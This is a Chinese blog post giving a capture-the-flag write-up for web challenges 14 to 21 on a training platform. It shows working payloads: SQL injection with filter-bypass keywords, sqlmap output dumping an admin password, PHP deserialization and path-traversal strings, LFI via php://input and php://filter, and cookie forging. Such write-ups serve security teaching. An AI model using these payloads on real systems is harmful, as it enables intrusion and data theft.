<html>

<head>
  <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CTF论剑场 Web14-21 WriteUp | 3ND</title>
<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627826313347">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="CTF论剑场 Web14-21 WriteUp | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="
文章首发于安恒网络空间安全讲武堂

web14 GitHack

hint：听说备份了不少东西呢


根据hint信息可以猜测为/.git/敏感文件泄露，该目录下包含了所有 git 正常工作所需要的信息。
使用GitHack工具(项目地址..." />
    <meta name="keywords" content="Writeup,CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
    <script src="/media/highlight.min.js"></script>
</head>

<body>
  <div class="main">
    <div class="main-content">
      <div class="site-header">
  <a href="https://3nd.xyz">
  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627826313347" alt="">
  </a>
  <h1 class="site-title">
    3ND
  </h1>
  <p class="site-description">
    夏が終わった
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    <a href="https://github.com/inspiringz" target="_blank">
      <i class="ri-github-fill"></i>
    </a>
    <a href="mailto:z@3nd.xyz" target="_blank">
      <i class="ri-mail-send-fill"></i>
  </a>
  <a href="#">
    <i class="ri-fire-fill"></i>
</a>
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              CTF论剑场 Web14-21 WriteUp
            </h2>
            <div class="post-info">
              <span>
                2019-04-25
              </span>
              <span>
                12 min read
              </span>
              <span class="page-view" key="20190425205900" title="CTF论剑场 Web14-21 WriteUp">
              </span>
              
                <a href="https://3nd.xyz/tag/writeup/" class="post-tag">
                  # Writeup
                </a>
                
                <a href="https://3nd.xyz/tag/ctf/" class="post-tag">
                  # CTF
                </a>
                
            </div>
            
                <div class="post-content-wrapper">
                  <div class="post-content">
                    <blockquote>
<p>文章首发于安恒网络空间安全讲武堂</p>
</blockquote>
<h2 id="web14-githack">web14 GitHack</h2>
<blockquote>
<p>hint：听说备份了不少东西呢</p>
</blockquote>
<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/1552754298863-5b7fc7f5-8072-4fc4-9eb0-fb82a532cfcc.png" alt="" loading="lazy"></figure>
<p>根据hint信息可以猜测为<code>/.git/</code>敏感文件泄露，该目录下包含了所有 git 正常工作所需要的信息。</p>
<p>使用<code>GitHack</code>工具(项目地址:https://github.com/lijiejie/GitHack)进行探测:</p>
<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/1552754784498-5dcb848e-0743-4fab-b0bc-4e6112fab031.png" alt="" loading="lazy"></figure>
<h2 id="web15-vim">web15 vim</h2>
<p>hint: vim编辑器</p>
<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/1552790422604-d6e12a34-3495-457e-b8f1-95a6b22ffcfc.png" alt="" loading="lazy"></figure>
<p>尝试提交<code>id</code>参数为swp，回显：<strong>不是这里不是这里不是这里!!!</strong>。</p>
<p>注意到此时的链接为<code>/1ndex.php?id=swp&amp;submit=提交查询#</code>，尝试修改<strong>1</strong>为<strong>i</strong>并提交访问，得到flag{Is_wh1te_ooo000oo0}。</p>
<h2 id="web16-江湖">web16 江湖</h2>
<p>学会如来神掌应该就能打败他了吧</p>
<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/1552790728537-029e66ca-6aa9-4b54-9747-f9819852ab3a.png" alt="" loading="lazy"></figure>
<p>进入江湖：</p>
<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/1552790783917-2333e15d-e11a-46f1-9daa-f88704e9756e.png" alt="" loading="lazy"></figure>
<p>点击<strong>刷新属性</strong>会刷新各属性的值，动态变化，点击<strong>确定</strong>进入：</p>
<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/1552790940944-c06d9bdb-818b-47db-bb9d-a63fcb76ed06.png" alt="" loading="lazy"></figure>
<ul>
<li>属性中提示：每次练功和赚钱都会消耗5秒的时间,请您耐心等待。</li>
<li>每次练功会增加一定的属性提升，耗时5s一次。</li>
<li>商店中提示：必须将血量、内力、力道、定力修炼到满才可以学习如来神掌。</li>
<li>点击赚钱每次会增加100银两的收入。</li>
</ul>
<p>结合<strong>学会如来神掌应该就能打败他了吧</strong>，推测思路为学会如来神掌后讨伐魔头，因此我们需要通过提升各属性值为满且从商店购买<strong>如来神掌</strong>。</p>
<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/1552835608314-5110a4c1-5057-442b-9f26-e387283b526b.png" alt="" loading="lazy"></figure>
<p>方案:拥有足够的银两即可提升属性值为满且学习如来神掌。</p>
<p>F12查看页面源代码发现有以下<code>js</code>脚本文件:</p>
<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/1552921173877-e5eaaf8e-7454-41cf-9f50-da27a09fb236.png" alt="" loading="lazy"></figure>
<p>另外<strong>Cookie</strong>如下:</p>
<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/1552792292999-c0c20899-fc49-467e-8a02-db9d29cceaf1.png" alt="" loading="lazy"></figure>
<p>下载script.js审计，这里使用VSCode进行查看（Windows下Shift + Alt + F进行代码格式化整理):</p>
<pre><code class="language-js">eval(function (p, a, c, k, e, r) {
    e = function (c) { return (c &lt; 62 ? '' : e(parseInt(c / 62))) + ((c = c % 62) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36)) };
    if ('0'.replace(0, e) == 0) {
        while (c--) r[e(c)] = k[c];
        k = [function (e) { return r[e] || e }];
        e = function () {
            return '[57-9abd-hj-zAB]'
        };
        c = 1
    };
    while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p
}('7 s(t){5 m=t+&quot;=&quot;;5 8=9.cookie.n(\';\');o(5 i=0;i&lt;8.d;i++){5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)}p&quot;&quot;}7 w(a){5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++){5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)}p r}7 ertqwe(){5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++){u(-1&lt;8[i].v(&quot;A&quot;)){e=8[i+1].n(&quot;:&quot;)[2]\}\}e=e.B(\'&quot;\',&quot;&quot;).B(\'&quot;\',&quot;&quot;);9.write(\'&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\');j(7(){9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;},1000);j(7(){9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;},2000);j(7(){9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;},3000);j(7(){9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;},4000);j(7(){alert(&quot;你使用如来神掌打败了蒙老魔，但不知道是真身还是假身，提交试一下吧!A{&quot;+md5(e)+&quot;}&quot;)},5000)}', [], 38, '|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'.split('|'), 0, {}))
</code></pre>
<p>发现代码进行了<code>packer</code>打包，直接在线解混后淆得到:</p>
<pre><code class="language-js">function getCookie(cname) {
    var name = cname + &quot;=&quot;;
    var ca = document.cookie.split(';');
    for (var i = 0; i &lt; ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length)
    }
    return &quot;&quot;
}

function decode_create(temp) {
    var base = new Base64();
    var result = base.decode(temp);
    var result3 = &quot;&quot;;
    for (i = 0; i &lt; result.length; i++) {
        var num = result[i].charCodeAt();
        num = num ^ i;
        num = num - ((i % 10) + 2);
        result3 += String.fromCharCode(num)
    }
    return result3
}

function ertqwe() {
    var temp_name = &quot;user&quot;;
    var temp = getCookie(temp_name);
    temp = decodeURIComponent(temp);
    var mingwen = decode_create(temp);
    var ca = mingwen.split(';');
    var key = &quot;&quot;;
    for (i = 0; i &lt; ca.length; i++) {
        if (-1 &lt; ca[i].indexOf(&quot;flag&quot;)) {
            key = ca[i + 1].split(&quot;:&quot;)[2]
        }
    }
    key = key.replace('&quot;', &quot;&quot;).replace('&quot;', &quot;&quot;);
    document.write('&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;');
    setTimeout(function() {
        document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-2.jpg&quot;
    }, 1000);
    setTimeout(function() {
        document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-3.jpg&quot;
    }, 2000);
    setTimeout(function() {
        document.getElementById(&quot;attack-1&quot;).src = &quot;image/1-4.jpg&quot;
    }, 3000);
    setTimeout(function() {
        document.getElementById(&quot;attack-1&quot;).src = &quot;image/6.png&quot;
    }, 4000);
    setTimeout(function() {
        alert(&quot;你使用如来神掌打败了蒙老魔，但不知道是真身还是假身，提交试一下吧!flag{&quot; + md5(key) + &quot;}&quot;)
    }, 5000)
}
</code></pre>
<p>控制台执行如下命令：</p>
<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/1552796073423-ec88efa7-4f18-4e54-a926-8d8a6d0344f5.png" alt="" loading="lazy"></figure>
<p>尝试修改各属性值money为1000000并加密，PHP脚本如下（这里感谢<a href="https://www.cnblogs.com/leixiao">淚笑</a>师傅的指导<sub>自写的python脚本存在一些问题结果不一致</sub>）：</p>
<pre><code class="language-php">&lt;?php
function encode($payload) {
	$result = '';
    for($i = 0; $i &lt; strlen($payload); $i++) {
    	$b = ord($payload[$i]);
        $b = $b + (($i % 10) + 2);
        $b = $b ^ $i;
        $result = $result.chr($b);
	}
	return $result;
}

$payload = 'O:5:&quot;human&quot;:10:{s:8:&quot;xueliang&quot;;i:12;s:5:&quot;neili&quot;;i:856;s:5:&quot;lidao&quot;;i:83;s:6:&quot;dingli&quot;;i:92;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:1000000;s:4:&quot;flag&quot;;s:1:&quot;1&quot;;}';

echo base64_encode(encode($payload));

//UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeFxphX2YZYgxYQ0VeXQRrQ3QICw51T3YFehZMV1pbS2gDMwAGe3sxdnIKYiA/Nj0+PXQTOxQXbB0nZmFieiM3EREbGg1AWQkoXikXKC9SSgIbHR0DAgdaRRVETj0HPD/ErO7v9un57/6iz/+wvrH30KzQuBfl+Pv96rLZ7d6k2dWcm5yM0dHQxy2OlcGSmZiIiIiIhovBiIL4kNTK0dea/7mC+4bu/er1SQ==
//encodeURIComponent-&gt;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeFxphX2YZYgxYQ0VeXQRrQ3QICw51T3YFehZMV1pbS2gDMwAGe3sxdnIKYiA%2FNj0%2BPXQTOxQXbB0nZmFieiM3EREbGg1AWQkoXikXKC9SSgIbHR0DAgdaRRVETj0HPD%2FErO7v9un57%2F6iz%2F%2BwvrH30KzQuBfl%2BPv96rLZ7d6k2dWcm5yM0dHQxy2OlcGSmZiIiIiIhovBiIL4kNTK0dea%2F7mC%2B4bu%2Fer1SQ%3D%3D
?&gt;
</code></pre>
<p>将修改后的cookie字段发包:</p>
<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/1552837997497-7add57ed-7416-4ed9-9e26-c2197e7d5236.png" alt="" loading="lazy"></figure>
<p>提升属性和学习如来神掌后讨伐老魔获取flag：</p>
<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/1552838417921-5e63eaa8-5358-4ed7-ba4f-e1fc6fbf0753.png" alt="" loading="lazy"></figure>
<p>另外在<code>/wulin.php</code>下发现了出题人留下的彩蛋，可以检测flag的正确性：</p>
<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/1552838560315-2e7a313f-0861-49fd-bba7-4e4b9fb4f662.png" alt="" loading="lazy"></figure>
<h2 id="web17-流量分析">web17 流量分析</h2>
<p>直接使用Wireshark打开bugku.pcapng进行TCP流追踪即可找到flag。</p>
<figure data-type="image" tabindex="14"><img src="https://3nd.xyz/post-images/move/1552920480203-0dd89ae0-39fa-45c5-b3a2-1f569d42bbb0.png" alt="" loading="lazy"></figure>
<h2 id="web18-sql-injection">web18 Sql injection</h2>
<figure data-type="image" tabindex="15"><img src="https://3nd.xyz/post-images/move/1552883028265-5171c1ed-f4c3-474c-b100-cb08239d803d.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://3nd.xyz/post-images/move/1552882900403-54768523-ac70-43d2-98cf-edeba4bd50e2.png" alt="" loading="lazy"></figure>
<p>试探过程如下：</p>
<pre><code class="language-sql">?id=1'  回显空白 -&gt; 可能为单引号闭合
?id=1'--+ 回显正常 -&gt; 单引号闭合方式
?id=1' and 1=1--+ 回显空白 -&gt; 可能过滤了and
?id=1' And 1=1--+ 回显空白 -&gt; 可能过滤了大小写
?id=1' anandd 1=1--+ 回显正常 -&gt; 嵌套剥离绕过 过滤了and、or
?id=1' oorrder by 3--+ -&gt;列数为3
</code></pre>
<p>爆数据库：</p>
<pre><code class="language-sql">?id=-1' uniunionon selselectect 1,group_concat(schema_name),3 from infoorrmation_schema.schemata--+
</code></pre>
<p>得到:information_schema,web18.</p>
<p>爆表：</p>
<pre><code class="language-sql">?id=-1' uniunionon selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema='web18'--+
</code></pre>
<p>得到: ctf,flag.</p>
<p>爆列：</p>
<pre><code class="language-sql">?id=-1' uniunionon selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='flag'--+
</code></pre>
<p>得到：id,flag.</p>
<p>爆字段：</p>
<pre><code class="language-sql">?id=-1' uniunionon selselectect 1,flag,3 from flag--+
</code></pre>
<p>获取flag{22b7a7c3d73d88050722b3eeb102ee45} .</p>
<h2 id="web19-poc-and-exps-love-note">web19 Poc And Exp's Love Note</h2>
<figure data-type="image" tabindex="17"><img src="https://3nd.xyz/post-images/move/1552903244586-895c66f6-aa11-4ac5-96a8-f36f409d5a00.png" alt="" loading="lazy"></figure>
<p><code>dirsearch</code>探测下发现存在<code>/.git/</code>泄露:</p>
<figure data-type="image" tabindex="18"><img src="https://3nd.xyz/post-images/move/1552903604902-d4b85ef9-98bc-4af8-9eea-c27af92f99a7.png" alt="" loading="lazy"></figure>
<p><code>Githack</code>操作一下，在flag.txt中获取Hint 1: flag is in /eXpl0ve5p0cVeRymuCh。</p>
<figure data-type="image" tabindex="19"><img src="https://3nd.xyz/post-images/move/1552904156016-c2065fec-a46e-4b57-a6d7-2f8ad930c581.png" alt="" loading="lazy"></figure>
<p><code>sqlmap</code>跑一下，发现存在基于时间的布尔盲注：</p>
<pre><code class="language-bash">---
Parameter: username (POST)
    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind
    Payload: username=admin' AND SLEEP(5) AND 'JKEb'='JKEb&amp;password=123
    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
---
</code></pre>
<p>继续获取信息:</p>
<pre><code class="language-bash">available databases [2]:
[*] information_schema
[*] web19
In Database: web19
[2 tables]
+--------+
| user   |
| hlnt_2 |
+--------+
Database: web19
Table: user
[1 entry]
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
| 1  | admin    | p0CLOvesExpT00 |
+----+----------+----------------+
Database: web19
Table: hlnt_2
[1 entry]
+----+-----------------------------------------------+
| id | hInt                                          |
+----+-----------------------------------------------+
| 1  | a class for you &quot;https://postimg.cc/6274vCP5&quot; |
+----+-----------------------------------------------+
</code></pre>
<p>用获取到的username和password登录admin账户:</p>
<figure data-type="image" tabindex="20"><img src="https://3nd.xyz/post-images/move/1552906316323-20c7f067-90a1-4930-8a98-75b8e30c7961.png" alt="" loading="lazy"></figure>
<p>查看页面源代码发现有注释掉的内容:</p>
<figure data-type="image" tabindex="21"><img src="https://3nd.xyz/post-images/move/1552906718771-46c85a2b-20e2-45f2-8678-c81717c7f3dd.png" alt="" loading="lazy"></figure>
<p>结合<strong>游记内容</strong>推测可能为<a href="http://www.darkside.com.au/snow/">snow</a> HTML隐写（可以在ASCII文本的末行隐藏数据，并且可以通过插入制表位和空格使嵌入的数据在浏览器中不可见），使用BurpSuite抓取该页面内容保存至1.html（尝试从Firefox保存分析存在问题，感谢冷暗雨师傅指导~）.</p>
<figure data-type="image" tabindex="22"><img src="https://3nd.xyz/post-images/move/1552913911594-9c6dbd08-074b-428d-890f-e8dcc429953d.png" alt="" loading="lazy"></figure>
<pre><code class="language-bash">C:\Users\light\Desktop&gt;SNOW.EXE -C -p ILOveExp 1.html
flag in /PPPPOOO0CCCC.php
</code></pre>
<p>结合在hlnt_2表中获取的Hint2:<code>a class for you &quot;https://postimg.cc/6274vCP5&quot;</code>。</p>
<figure data-type="image" tabindex="23"><img src="https://3nd.xyz/post-images/move/1552905948498-139225fc-192b-4729-bf3e-789167cb6a2b.png" alt="" loading="lazy"></figure>
<p>Payload：</p>
<pre><code class="language-php">&lt;?php
class ReadFile {
	public $file;
}

$payload = new ReadFile();
$payload-&gt;file = '../../PPPPOOO0CCCC.php';
echo serialize($payload);

//O:8:&quot;ReadFile&quot;:1:{s:4:&quot;file&quot;;s:22:&quot;../../PPPPOOO0CCCC.php&quot;;}
//encodeURIComponent
//O%3A8%3A%22ReadFile%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A22%3A%22..%2F..%2FPPPPOOO0CCCC.php%22%3B%7D
</code></pre>
<figure data-type="image" tabindex="24"><img src="https://3nd.xyz/post-images/move/1552915162974-b150a5ab-0959-403f-b80e-ea36a748debb.png" alt="" loading="lazy"></figure>
<h2 id="web20-get_key">web20  GET_key</h2>
<p>你的动态密文是：fb49037b2bb5315bdad5228d7cf0c34e2<br>
GET提交对应的密文可以得到flag(form_input_name='key')<br>
输出格式：'flag{....}'</p>
<p>Python脚本：</p>
<pre><code class="language-python">import re
import requests

url = 'http://123.206.31.85:10020/'
r = requests.session()
text = r.get(url).text
key = re.findall(r'[0-9a-z]+', text)[0]
url2 = url + '?key=' + key
text2 = r.get(url2).text
print(text2)
</code></pre>
<p>多试几次，正确提交后有一定几率会获取flag{Md5tiMe8888882019}~</p>
<h2 id="web21-lfi">web21 LFI</h2>
<p>打开网页显示：</p>
<p>you are not admin !</p>
<p>F12查看发现注释掉的PHP代码：</p>
<pre><code class="language-php">$user = $_GET[&quot;user&quot;];
$file = $_GET[&quot;file&quot;];
$pass = $_GET[&quot;pass&quot;];
 
if(isset($user)&amp;&amp;(file_get_contents($user,'r')===&quot;admin&quot;)){
    echo &quot;hello admin!&lt;br&gt;&quot;;
    include($file); //class.php
}else{
    echo &quot;you are not admin ! &quot;;
}
</code></pre>
<p>看到<code>file_get_contents()</code>函数推测可能存在文件包含(参看<a href="https://github.com/SewellDinG/LFIboomCTF">LFI（Local File Include）漏洞</a>学习)，利用姿势如下:</p>
<ul>
<li>利用<code>php://input</code>和POST发包<code>admin</code>绕过file_get_contents($user,'r')===&quot;admin&quot;)。</li>
<li>利用<code>php://filter/read=convert.base64-encode/resource=class.php</code>来读取class.php。</li>
</ul>
<pre><code class="language-html">/index.php?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=class.php
</code></pre>
<p>得到回显:</p>
<pre><code class="language-html">hello admin!
PD9waHANCmVycm9yX3JlcG9ydGluZyhFX0FMTCAmIH5FX05PVElDRSk7DQogDQpjbGFzcyBSZWFkey8vZjFhOS5waHANCiAgICBwdWJsaWMgJGZpbGU7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsNCiAgICAgICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmZpbGUpOyAgICANCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIl9fdG9TdHJpbmcgd2FzIGNhbGxlZCEiOw0KICAgIH0NCn0NCj8+
</code></pre>
<p>解Base64得到class.php：</p>
<pre><code class="language-php">&lt;?php
error_reporting(E_ALL &amp; ~E_NOTICE);
 
class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this-&gt;file)){
            echo file_get_contents($this-&gt;file);    
        }
        return &quot;__toString was called!&quot;;
    }
}
?&gt;
</code></pre>
<p>注意到<code>__toString()</code>函数执行时会读取并打印<code>$this-&gt;file</code>的内容，构造序列化脚本：</p>
<pre><code class="language-php">&lt;?php
class Read{
	public $file;
}

$payload = new Read();
$payload-&gt;file = 'f1a9.php';
echo serialize($payload);
//O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;}
</code></pre>
<p>赋值给<code>pass</code>，当作为字符串是将调用**__toString()**读取f1a9.php的内容，Payload：</p>
<pre><code class="language-html">/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;}
</code></pre>
<figure data-type="image" tabindex="25"><img src="https://3nd.xyz/post-images/move/1552917136762-f843082b-862d-43c1-880c-5c0230ef6e27.png" alt="" loading="lazy"></figure>

                  </div>
                  <div class="toc-container">
                    <div style="position: sticky;
                    top: 20px;">
                    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#web14-githack">web14 GitHack</a></li>
<li><a href="#web15-vim">web15 vim</a></li>
<li><a href="#web16-%E6%B1%9F%E6%B9%96">web16 江湖</a></li>
<li><a href="#web17-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">web17 流量分析</a></li>
<li><a href="#web18-sql-injection">web18 Sql injection</a></li>
<li><a href="#web19-poc-and-exps-love-note">web19 Poc And Exp's Love Note</a></li>
<li><a href="#web20-get_key">web20  GET_key</a></li>
<li><a href="#web21-lfi">web21 LFI</a></li>
</ul>
</li>
</ul>

                  </div>
                  </div>
                </div>
          </article>
        </div>

        
          <div class="nearby-post" style="padding: 24px 32px;">
            <div class="prev-post" style="float: left;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter;text-align: left;">上一篇</div>
              <a href="https://3nd.xyz/post/2019-04-25-2019-jiaweisibei-WriteUp/">
                <h3 class="post-title" style="text-align: left;">
                  2019 “嘉韦思杯”上海市网络安全邀请赛 WriteUp
                </h3>
              </a>
            </div>
            <div class="next-posts" style="float: right;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter; text-align: right;">下一篇</div>
              <a href="https://3nd.xyz/post/2019-04-25-CTF-ljc-Web1-13-WriteUp/">
                <h3 class="post-title" style="
                text-align: right;">
                  CTF 论剑场 Web1-13 WriteUp
                </h3>
              </a>
            </div>
          </div>
          

                

                                <div class="site-footer">
  
  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

    </div>
  </div>

  <script>
    hljs.highlightAll();

    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

    // This should probably be throttled.
    // Especially because it triggers during smooth scrolling.
    // https://lodash.com/docs/4.17.10#throttle
    // You could do like...
    // window.addEventListener("scroll", () => {
    //    _.throttle(doThatStuff, 100);
    // });
    // Only not doing it here to keep this Pen dependency-free.

    window.addEventListener("scroll", event => {
      let fromTop = window.scrollY;

      mainNavLinks.forEach((link, index) => {
        let section = document.getElementById(decodeURI(link.hash).substring(1));
        let nextSection = null
        if (mainNavLinks[index + 1]) {
          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
        }
        if (section.offsetTop <= fromTop) {
          if (nextSection) {
            if (nextSection.offsetTop > fromTop) {
              link.classList.add("current");
            } else {
              link.classList.remove("current");
            }
          } else {
            link.classList.add("current");
          }
        } else {
          link.classList.remove("current");
        }
      });
    });
  </script>
<script src="/media/view-support.js"></script>
<script>
  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
    var pageview = window.pageview(AV, {
      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
      appClass: 'Gridea',
    });
    $('.page-view').each(function () {
      var $this = $(this);
      var key = $this.attr('key');
      var title = $this.attr('title');
      pageview.increase(key, title, function(view) {
        $("[key='" + key +"']").text(view+' views');
      });
    });
  });
</script>

</body>

</html>